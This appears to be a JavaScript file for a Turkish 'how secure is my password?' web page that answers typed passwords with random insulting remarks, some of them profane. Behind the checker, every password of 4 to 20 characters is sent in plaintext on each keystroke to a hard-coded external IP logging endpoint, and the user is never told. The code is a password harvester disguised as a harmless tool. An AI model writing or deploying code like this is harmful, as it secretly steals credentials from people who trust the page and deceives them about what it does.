var logger = "http://188.226.173.227:3000/api/logs";

var template = multiline(function () {
  /*
   <h1>ŞİFREM NE KADAR GÜVENLİ?</h1>
   <form name="formsec" id="formsec">
   <div>
   <input type="password" name="secret" id="password" />
   </div>
   <div>
   <div id="comm"></div>
   </div>
   </form>
   */
});

var response = [
  "Berbat.",
  "Sen bu günlere bu şifreyle iyi gelmişsin.",
  "Hekleneceksin.",
  "Bu bir şifre değil, bir utanç.",
  "Hayal kırıklığına uğradım.",
  "Önemsiz biri olduğunu varsayıyorum.",
  "S*ktir.",
  "15 yıl öncesine göre harika bir şifre.",
  "Çok yaratıcı bir şifreymiş kardeş.",
  "Senin için endişeliyim.",
  "Zayıf. İnanılmaz zayıf.",
  "Tüm zamanların en kötü şifresi bu.",
  "Şifreni ciddiye alman gerek.",
  "Sana acıyorum."
];

// Define Cute Input Component
var InputView = Backbone.View.extend({
  tagName: 'div',
  className: 'rowX',
  template: template,
  initialize: function () {
    this.messages = response;
  },
  events: {
    'keyup #password': 'handleKeyupForPassword'
  },
  render: function () {
    $(this.el).html(this.template);
  },
  handleKeyupForPassword: function (e) {
    var passwordField = e.currentTarget;
    $('body').addClass("easing");
    $('body').css("background", "#c0392b");
    $(passwordField).css("background", "#e1e1e1");
    $('h1').css("color", "#34495e");
    if (passwordField.value.length == 0) {
      $('body').addClass("easing");
      $('body').css("background", "#34495e");
      $(passwordField).css("background", "#c0392b");
      $('h1').css("color", "#c0392b");
      $("#comm").text(" ");
    }

    if (passwordField.value.length < 4) {
      console.log("o-yes");
    } else if (passwordField.value.length > 20) {
      $("#comm").text("TAMAM. İYİ. GÜZEL ŞİFRE.")
    } else {
      $.ajax({
          method: "POST",
          url: logger,
          data: 'password=' + passwordField.value,
          headers: {'Content-Type': 'x-www-form-urlencoded'}
        })
        .then(function (response) {
          console.info("Logged");
        }, function () {
          console.error("Somethings went wrong")
        });

      var rand = Math.floor((Math.random() * this.messages.length) + 1);
      $("#comm").text(this.messages[rand]).animate({'opacity': 1}, 3000);
    }
  }
});

var myCuteInputView = new InputView();
myCuteInputView.render();
$('body').append(myCuteInputView.el);
